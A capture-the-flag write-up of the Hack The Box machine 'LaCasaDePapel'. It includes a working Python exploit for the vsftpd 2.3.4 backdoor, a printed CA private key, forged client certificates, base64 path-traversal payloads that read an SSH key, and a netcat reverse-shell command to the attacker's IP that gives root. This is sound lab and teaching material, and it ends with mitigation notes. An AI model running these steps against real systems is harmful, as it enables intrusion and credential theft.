# LaCasaDePapel

```
kali@kali:~/htb/LaCasaDePapel$ sudo nmap -p- -sV -sC 10.129.106.229 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 13:05 EST
Nmap scan report for 10.129.106.229
Host is up (0.026s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 2.3.4
22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open     http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp  open     ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
6200/tcp filtered lm-x
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.51 seconds
kali@kali:~/htb/LaCasaDePapel$ 

```

So we have ftp, ssh, and a node.js web-server.

I connect to the web server, and get a Oauth prompt:

![](images/1.png)

I download the QR code to check that there's nothing special about it:

![](images/2.png)

I download an authentication addon for firefox and run it.

After submitting, I get an image that tells me that I need to check my email. Nothing there.

on the port 443 web server, I get a certification error:

`Sorry, but you need to provide a client certificate to continue.`


Ok, let's check other avenues:


```
kali@kali:~/htb/LaCasaDePapel$ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                    | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/LaCasaDePapel$ 
```

I actually wrote a python script for this exploit back on [Lame](https://github.com/matale14/Writeups/blob/e8cd58ad034b80621e68718201874790499b59dc/HTB/Lame/Lame.MD)

Here it is:

```
import socket, threading

def exploit():

        #Set up connection
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #connect to the ftp server
        s.connect(('10.129.106.229',21))
        #send the username and password
        s.send(b'USER hello:)\n')
        s.send(b'PASS secret\n')

        #Set up Backdoor connection
        bd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #Connect to backdoor
        bd.connect(('10.129.106.229', 6200))
        bd_status = True

        #Setup the thread 
        shell_recv_thread = threading.Thread(target=shellSendResponse, args=(bd, bd_status))
        shell_recv_thread.start()

        while 1:
                #enter command
                command = input().strip()
                #Exit clause
                if command == 'exit':
                        bd_status = False
                        bd.close()
                        shell_recv_thread.join()
                        sys.exit(0)
                #send command
                bd.send((command + '\n').encode())


def shellSendResponse(sock, status):
        #this function will print the information recieved continuously
        sock.settimeout(5)
        while status == True:
                try:
                        print(sock.recv(1024).strip().decode())
                except socket.timeout:
                        pass
                except Exception:
                        return

exploit()
```


```
kali@kali:~/htb/LaCasaDePapel$ python3 ftpbd.py
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman

ls
Variables: $tokyo

whoami
PHP Warning:  Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1

id
PHP Warning:  Use of undefined constant id - assumed 'id' (this will throw an Error in a future version of PHP) in phar://eval()'d code on line 1

ls -la

Variables:
  $tokyo   Tokyo {#2307}  
  $_       null
help
help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?
ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
  dump       Dump an object or primitive.                                                                                
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
  show       Show the code for an object, class, constant, method or property.                                           
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
  whereami   Show where you are in the code.                                                                             
  throw-up   Throw an exception or error out of the Psy Shell.                                                           
  timeit     Profiles with a timer.
trace      Show the current call stack.                                                                                
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf
clear      Clear the Psy Shell screen.                                                                                 
  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
  history    Show the Psy Shell history.                                                  Aliases: hist                  
  exit       End the current session and return to caller.                                Aliases: quit, q
```

So we have some sort of shell called Psy Shell, that is based in PHP. Let's google around that.

I find out that we can run shell_exec() by surrounding the command with backticks: \`whoami\`

```
`whoami`
PHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()'d code on line 1
 
```

hmm. So it's disabled.

I do some more googling and find some other commands to use:

```
scandir('/')
=> [
     ".",
     "..",
     ".DS_Store",
     "._.DS_Store",
     "bin",
     "boot",
     "dev",
     "etc",
     "home",
     "lib",
     "lost+found",
     "media",
     "mnt",
     "opt",
     "proc",
     "root",
     "run",
     "sbin",
     "srv",
     "swap",
     "sys",
     "tmp",
     "usr",
     "var",
   ]


scandir('/home')
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]

scandir ('/home/professor')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "memcached.ini",
     "memcached.js",
     "node_modules",
   ]

```

So we can move around a bit.

I tried reading the ssh file:

```
readfile('/home/professor/.ssh')
PHP Warning:  readfile(/home/professor/.ssh): failed to open stream: Permission denied in phar://eval()'d code on line 1
```

But we don't have permission.

Checking out all the folders I eventually find this in Nairobi:

```
scandir('/home/nairobi')
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]

readfile('/home/nairobi/ca.key')
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydj
wSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
=> 1704
```

And also this in Oslo:

```
scandir ('/home/oslo')
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]

scandir('/home/oslo/Maildir')
=> [
     ".",
     "..",
     ".Sent",
     ".Spam",
     "cur",
     "new",
     "tmp",
   ]

scandir('/home/oslo/Maildir/cur')
=> [
     ".",
     "..",
   ]

scandir('/home/oslo/Maildir/new')
=> [
     ".",
     "..",
   ]

scandir('/home/oslo/Maildir/.Sent')
=> [
     ".",
     "..",
     "cur",
     "new",
     "tmp",
   ]

scandir('/home/oslo/Maildir/.Sent/cur')
=> [
     ".",
     "..",
     "1614711128493.M68885P22118V0000000000052335I00000000054334a.lacasadepapel.htb,S=430,2,S",
   ]

readfile('/home/oslo/Maildir/.Sent/cur/1614711128493.M68885P22118V0000000000052335I00000000054334a.lacasadepapel.htb,S=430,2,S')
Content-Type: text/plain; format=flowed
From: dali@lacasadepapel.htb
To: testmail@testmail.com
Content-Transfer-Encoding: 7bit
Date: Tue, 02 Mar 2021 18:52:08 +0000
Message-Id: <1614711128507-1e6566a4-c790ded9-449078a8@lacasadepapel.htb>
MIME-Version: 1.0

Welcome to our community!
Thanks for signing up. To continue, please verify your email address by 
clicking the url below.
https://lacasadepapel.htb/63cab5d0-7b88-11eb-95ea-e543b46c4475
=> 459

 
```



361616

testmail@testmail.com


After going to https://lacasadepapel.htb/63cab5d0-7b88-11eb-95ea-e543b46c4475

![](images/3.png)

I download the ca.crt file.

So now we have the ca.key from nairobi, and the ca.crt file.

With this we can generate a certification for this server.

I try:

```
kali@kali:~/htb/LaCasaDePapel$ sudo openssl pkcs12 -export -out cert.pfx -inkey ca.key -in ca.crt -certfile ca.crt
Enter Export Password:
Verifying - Enter Export Password:
```

but nothing happens when I import it to firefox.

So i try another way:


First we generate a private key for the SSL client:

```
kali@kali:~/htb/LaCasaDePapel$ sudo openssl genrsa -out gen.key 4096
Generating RSA private key, 4096 bit long modulus (2 primes)
..........................................................................++++
...........................................................................................................................................................................++++
e is 65537 (0x010001)
```

Now we can generate a certification request:

```
kali@kali:~/htb/LaCasaDePapel$ sudo openssl req -new -key gen.key -out gen.req
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:SP
State or Province Name (full name) [Some-State]:None
Locality Name (eg, city) []:Madrid
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:LCDP
Common Name (e.g. server FQDN or YOUR name) []:Smiley
Email Address []:testmail@testmail.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Now we can issue the client certificate by using the request, the nairobi key and the CA cert we got from the website.

```
kali@kali:~/htb/LaCasaDePapel$ sudo openssl x509 -req -in gen.req -CA ca.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out gen.cer
Signature ok
subject=C = SP, ST = None, L = Madrid, O = La Casa De Papel, OU = LCDP, CN = Smiley, emailAddress = testmail@testmail.com
Getting CA Private Key
```

The final thing we need to do is convert it to pkcs#12 so we can import it to firefox:

```
kali@kali:~/htb/LaCasaDePapel$ sudo openssl pkcs12 -export -inkey gen.key -in gen.cer -out gen.p12
Enter Export Password:
Verifying - Enter Export Password:
```

Normally you can just import it via the firefox preferences, but for some reason when I clicked import and entered the password, nothing happened.

I even tried `pk12util -d /home/kali/.mozilla/firefox/yphdb3oi.default/ -i gen.p12`

But it did not work.


So I actually ended up just downloading the Opera browser and using that to import the certificates and access the page.

We are given access to a private area with Season-1 and Season-2.

There's 22 .avi files to download.

The URL is "https://lacasadepapel.htb/?path=SEASON-1"

so we have a parameter for the path here, so maybe we can do some Local file inclusion?

I do `../` and it reveals one of the home directories. I can enter into the directories, but the files are not clickable.

And trying the path directly results in:

```
Error: ENOTDIR: not a directory, scandir '/home/berlin/downloads/../user.txt/'
    at Object.fs.readdirSync (fs.js:904:18)
    at /home/berlin/server.js:10:20
    at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/berlin/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/berlin/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/berlin/node_modules/express/lib/router/layer.js:95:5)
    at /home/berlin/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/berlin/node_modules/express/lib/router/index.js:335:12)
    at next (/home/berlin/node_modules/express/lib/router/index.js:275:10)
    at expressInit (/home/berlin/node_modules/express/lib/middleware/init.js:40:5)
```

But if we look at the download path for the .avi files, they seem encoded:

`https://lacasadepapel.htb/file/U0VBU09OLTIvMDEuYXZp`

```
kali@kali:~/htb/LaCasaDePapel$ echo "U0VBU09OLTIvMDEuYXZp" | base64 -d ; echo;
SEASON-2/01.avi
```

Ok, so the download URL is base64 encoded. Can we use this to access the other files?

Let's try to download /home/berlin/user.txt


```
kali@kali:~/htb/LaCasaDePapel$ echo -n "/home/berlin/user.txt" | base64
L2hvbWUvYmVybGluL3VzZXIudHh0
```

So I try going to `https://lacasadepapel.htb//file/L2hvbWUvYmVybGluL3VzZXIudHh0`

And I do download a file called user.txt, but it's just a html file containing an error.

However, the error is that the file does not exist. Not that I don't have permissions. So it seems to be more of a path error.

```
kali@kali:~/htb/LaCasaDePapel$ echo -n "../../../../../home/berlin/user.txt" | base64
Li4vLi4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=
kali@kali:~/htb/LaCasaDePapel$ 
```


This actually worked, and I got the user flag.

So I spotted tons of .ssh directories etc. while looking at the home directories, so let's see if we can get the berlin id_rsa.

```
kali@kali:~/htb/LaCasaDePapel$ echo -n "../../../../home/berlin/.ssh/id_rsa" | base64
Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
```

I try ssh'ing in as berlin, but it requires a password. So I try the other users until I find that professor works.

```
kali@kali:~/htb/LaCasaDePapel$ sudo ssh -i id_rsa professor@lacasadepapel.htb
The authenticity of host 'lacasadepapel.htb (10.129.107.31)' can't be established.
ECDSA key fingerprint is SHA256:rA99W+GVzo0hlABp1vMj9ChhjLwybPhHTpb65AWm7xI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'lacasadepapel.htb,10.129.107.31' (ECDSA) to the list of known hosts.
X11 forwarding request failed on channel 0

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
lacasadepapel [~]$ 
```

In professor's home folder we get this:

```
lacasadepapel [~]$ ls -la
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6  2019 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
lacasadepapel [~]$ 
```

I run `ps` and see ` 5813 nobody    0:11 /usr/bin/node /home/professor/memcached.js`

So this script is probably being ran continuously.

We do not have permissions to edit the ini file, which seems to contain the code being ran. But if we see the permissions for the current folder, they are:

`drwxr-sr-x`

The `s` here signifies that the folder has a SGID bit set.

This means that all files created in this directory belong to the group that owns the directory. 

So since professor is in the group that owns the directory, the files belong to us. And although we cannot edit the file, we can delete it and replace it with our own.

```
lacasadepapel [~]$ rm memcached.ini
rm: remove 'memcached.ini'? yes
```

I change it to: 

```
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo chmod 4755 /bin/bash
lacasadepapel [~]$ ls -l /bin/bash
-rwxr-xr-x    1 root     root        715008 May  1  2018 /bin/bash
lacasadepapel [~]$ 
```

And I try `bash -p` to get a privileged root, but nothing happens.

So I delete it again and try:

```
[program:memcached]
command = sudo /usr/bin/nc 10.10.14.60 1337 -e /bin/sh
```
And after listening for a couple of seconds we get a root:

```
kali@kali:~/htb/LaCasaDePapel$ sudo nc -nlvp 1337
[sudo] password for kali: 
Listening on 0.0.0.0 1337
Connection received on 10.129.107.31 34729
whoami
root
```

## Comparing myself to the official writeup:

The QR code OTP does not work for the official writeup. It did for me, maybe an update?

they find the vsftp exploit and find the psy shell.

because they did not get the QR code OTP, the email with the confirmation URL does not exist.

So they had to export the certificate from the browser and generate a new certificate. The same thing I did after the first certificate did not import on firefox.

they use pspy to enumerate the system, and find the js node file being run.

they rename the file and create a new one with a reverse shell.



## How to stop this exploit:

The vsftpd version is obviously backdoored, so that should be patched. As it creates a backdoor when a smiley face is sent in the username.

While most of the system is correctly locked behind permissions, the rogue .ssh folder and certificates should not be accessible. 

And the last mistake is having a cron-job running in a directory with a SGID bit set.

